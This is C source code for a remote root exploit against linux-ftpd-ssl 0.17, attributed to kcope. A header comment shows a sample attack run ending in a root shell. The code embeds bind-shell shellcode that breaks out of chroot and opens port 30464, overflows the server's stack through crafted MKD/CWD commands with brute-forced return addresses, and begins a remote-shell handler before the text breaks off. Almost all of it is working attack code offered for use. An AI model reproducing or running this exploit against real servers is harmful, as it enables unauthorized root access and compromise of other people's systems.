/*Oct2005 VER2*/
/**********************************************************/
/** lnxFTPDssl_warez.c                                   **/
/** linux-ftpd-ssl 0.17 remote r00t exploit by kcope     **/
/** for all of those who installed the ssl ready version **/
/** of linux-ftpd to be more "secure"                    **/
/**                                                      **/
/** be aware of the buffer overflows,                    **/
/** the code is strong cryto                             **/
/**********************************************************/
/** thanx blackzero,revoguard,wY!,net_spy                **/
/** Confidential. Keep Private!                          **/
/**********************************************************/
/**
C:\Dokumente und Einstellungen\Administrator\Desktop>telnet 192.168.2.9 21
220 localhost.localdomain FTP server (Version 6.4/OpenBSD/Linux-ftpd-0.17) ready.
AUTH SSL
234 AUTH SSL OK.
;PpPpPPpPPPpPPPPpPppPPPPPpPpPPPpPPpPpPPpPPPpPPPPpPppPPPPPpPpPPPpP
C:\Dokumente und Einstellungen\Administrator\Desktop>lnxFTPDssl_warez.exe 192.168.2.9 kcope password
lnxFTPDssl_warez.c
linux-ftpd-ssl 0.17 remote r00t exploit by kcope

connecting to 192.168.2.9:21... ok.
OK - STARTING ATTACK
+++ USING STACK ADDRESS 0xbfffcc03 +++
+++ USING STACK ADDRESS 0xbfffcc13 +++
+++ USING STACK ADDRESS 0xbfffcc23 +++
+++ USING STACK ADDRESS 0xbfffcc33 +++
+++ USING STACK ADDRESS 0xbfffcc43 +++
+++ USING STACK ADDRESS 0xbfffcc53 +++
+++ USING STACK ADDRESS 0xbfffcc63 +++
+++ USING STACK ADDRESS 0xbfffcc73 +++
+++ USING STACK ADDRESS 0xbfffcc83 +++
+++ USING STACK ADDRESS 0xbfffcc93 +++
+++ USING STACK ADDRESS 0xbfffcca3 +++
+++ USING STACK ADDRESS 0xbfffccb3 +++
+++ USING STACK ADDRESS 0xbfffccc3 +++
+++ USING STACK ADDRESS 0xbfffccd3 +++
+++ USING STACK ADDRESS 0xbfffcce3 +++
+++ USING STACK ADDRESS 0xbfffccf3 +++
+++ USING STACK ADDRESS 0xbfffcd03 +++
+++ USING STACK ADDRESS 0xbfffcd13 +++
+++ USING STACK ADDRESS 0xbfffcd23 +++
+++ USING STACK ADDRESS 0xbfffcd33 +++
+++ USING STACK ADDRESS 0xbfffcd43 +++
+++ USING STACK ADDRESS 0xbfffcd53 +++
+++ USING STACK ADDRESS 0xbfffcd63 +++
+++ USING STACK ADDRESS 0xbfffcd73 +++
+++ USING STACK ADDRESS 0xbfffcd83 +++
+++ USING STACK ADDRESS 0xbfffcd93 +++
+++ USING STACK ADDRESS 0xbfffcda3 +++
+++ USING STACK ADDRESS 0xbfffcdb3 +++
+++ USING STACK ADDRESS 0xbfffcdc3 +++
+++ USING STACK ADDRESS 0xbfffcdd3 +++
+++ USING STACK ADDRESS 0xbfffcde3 +++
+++ USING STACK ADDRESS 0xbfffcdf3 +++
+++ USING STACK ADDRESS 0xbfffce03 +++
+++ USING STACK ADDRESS 0xbfffce13 +++
+++ USING STACK ADDRESS 0xbfffce23 +++
+++ USING STACK ADDRESS 0xbfffce33 +++
+++ USING STACK ADDRESS 0xbfffce43 +++
+++ USING STACK ADDRESS 0xbfffce53 +++
+++ USING STACK ADDRESS 0xbfffce63 +++
+++ USING STACK ADDRESS 0xbfffce73 +++
+++ USING STACK ADDRESS 0xbfffce83 +++
+++ USING STACK ADDRESS 0xbfffce93 +++
+++ USING STACK ADDRESS 0xbfffcea3 +++
+++ USING STACK ADDRESS 0xbfffceb3 +++
+++ USING STACK ADDRESS 0xbfffcec3 +++

Let's get ready to rumble!
id
uid=0(root) gid=0(root) egid=1000(kcope) groups=1000(kcope),20(dialout),24(cdrom
),25(floppy),29(audio),44(video),46(plugdev)
uname -a
Linux debian 2.4.27-2-386 #1 Mon May 16 16:47:51 JST 2005 i686 GNU/Linux

**/
// Tested on    Linux 2.4.18-14 Redhat 8.0
//              Linux 2.2.20-idepci Debian GNU 3.0
//              Linux 2.4.27-2-386 Debian GNU 3.1
// CHECK VER3 FOR MORE SUPPORT!!!
// ***KEEP IT ULTRA PRIV8***

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define BUF_SIZ 4096
#define PORT 21
#define BINDPORT 30464
#define STACK_START 0xbfffcc03
#define STACK_END 0xbffff4f0

/*my shellcode*/
/*setreuid,chroot break,
bind to port 30464, 0xff is double*/
unsigned char lnx_bind[] =
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xEB\x70\x31\xC0\x31\xDB\x31\xC9"
"\xB0\x46\xCD\x80\x5E\x90\xB8\xBE"
"\xff\xff\xff\xff\xff\xff\xF7\xD0"
"\x89\x06\xB0\x27\x8D\x1E\xFE\xC5"
"\xB1\xED\xCD\x80\x31\xC0\x8D\x1E"
"\xB0\x3D\xCD\x80\x66\xB9\xff\xff"
"\x03\xBB\xD2\xD1\xD0\xff\xff\xF7"
"\xDB\x89\x1E\x8D\x1E\xB0\x0C\xCD"
"\x80\xE2\xEF\xB8\xD1\xff\xff\xff"
"\xff\xff\xff\xF7\xD0\x89\x06\xB0"
"\x3D\x8D\x1E\xCD\x80\x31\xC0\x31"
"\xDB\x89\xF1\xB0\x02\x89\x06\xB0"
"\x01\x89\x46\x04\xB0\x06\x89\x46"
"\x08\xB0\x66\x43\xCD\x80\x89\xF1"
"\x89\x06\xB0\x02\x66\x89\x46\x0C"
"\xEB\x04\xEB\x74\xEB\x77\xB0\x77"
"\x66\x89\x46\x0E\x8D\x46\x0C\x89"
"\x46\x04\x31\xC0\x89\x46\x10\xB0"
"\x10\x89\x46\x08\xB0\x66\x43\xCD"
"\x80\xB0\x01\x89\x46\x04\xB0\x66"
"\xB3\x04\xCD\x80\x31\xC0\x89\x46"
"\x04\x89\x46\x08\xB0\x66\xB3\x05"
"\xCD\x80\x88\xC3\xB0\x3F\x31\xC9"
"\xCD\x80\xB0\x3F\xB1\x01\xCD\x80"
"\xB0\x3F\xB1\x02\xCD\x80\xB8\xD0"
"\x9D\x96\x91\xF7\xD0\x89\x06\xB8"
"\xD0\x8C\x97\xD0\xF7\xD0\x89\x46"
"\x04\x31\xC0\x88\x46\x07\x89\x76"
"\x08\x89\x46\x0C\xB0\x0B\x89\xF3"
"\x8D\x4E\x08\x8D\x56\x0C\xCD\x80"
"\xE8\x15\xff\xff\xff\xff\xff\xff";

long ficken() {
       printf("lnxFTPDssl_warez.c\nlinux-ftpd-ssl 0.17 remote r00t exploit by kcope\n\n");
       return 0xc0debabe;
}

void usage(char **argv) {
       printf("Insufficient parameters given.\n");
       printf("Usage: %s <remotehost> <user> <pass> [writeable directory]\n", argv[0]);
       exit(0);
}

void _recv(int sock, char *buf) {
       int bytes=recv(sock, buf, BUFSIZ, 0);
       if (bytes < 0) {
               perror("read() failed");
               exit(1);
       }
}

void attack(int sock, unsigned long ret, char *pad) {
       int i,k;
       char *x=(char*)malloc(1024);
       char *bufm=(char*)malloc(1024);
       char *bufc=(char*)malloc(1024);
       char *rbuf=(char*)malloc(BUFSIZ+10);
       char *nops=(char*)malloc(1024);
       unsigned char a,b,c,d;

       memset(nops,0,1024);
       memset(nops,0x90,255);
       memset(x,0,1024);
       for (i=0,k=0;i<60;i++) {
               a=(ret >> 24) & 0xff;
               b=(ret >> 16) & 0xff;
               c=(ret >> 8) & 0xff;
               d=(ret) & 0xff;

               if (d==255) {
                       x[k]=d;
                       x[++k]=255;
               } else {
                       x[k]=d;
               }

               if (c==255) {
                       x[k+1]=c;
                       x[++k+1]=255;
               } else {
                       x[k+1]=c;
               }

               if (b==255) {
                       x[k+2]=b;
                       x[++k+2]=255;
               } else {
                       x[k+2]=b;
               }

               if (a==255) {
                       x[k+3]=a;
                       x[++k+3]=255;
               } else {
                       x[k+3]=a;
               }

               k+=4;
       }

       snprintf(bufm, 1000, "MKD %s%s\r\n", pad, x); // 1x'A' redhat 8.0 / 2x'A' debian gnu 3.0 / 3x'A' debian gnu 3.1
       snprintf(bufc, 1000, "CWD %s%s\r\n", pad, x);
       for (i=0; i<11; i++) {
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);
       }

       for (i=0; i<2; i++) {
               snprintf(bufm, 1000, "MKD %s\r\n", lnx_bind);
               snprintf(bufc, 1000, "CWD %s\r\n", lnx_bind);
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);

               snprintf(bufm, 1000, "MKD %s\r\n", nops);
               snprintf(bufc, 1000, "CWD %s\r\n", nops);
               send(sock, bufm, strlen(bufm), 0);
               recv(sock, rbuf, BUFSIZ, 0);
               send(sock, bufc, strlen(bufc), 0);
               recv(sock, rbuf, BUFSIZ, 0);
       }

       send(sock, "XPWD\r\n", strlen("XPWD\r\n"), 0);

       free(bufm);
       free(bufc);
       free(x);
       free(rbuf);
}

int do_remote_shell(int sockfd)
{
       while(1)
        {
           fd_set fds;
           FD_ZERO(&fds);
           FD_SET(0,&fds);
           FD_SET(sockfd,&fds);
           if(select(FD_SETSIZE,&fds,NULL,NULL,NULL))
           {
              int cnt;
              char buf[1024];
              if(FD_ISSET(0,&fds))
              {
                 if((cnt=read(0,buf,1024))<1)
                 {
                    if(errno==EWOULDBLOCK||errno==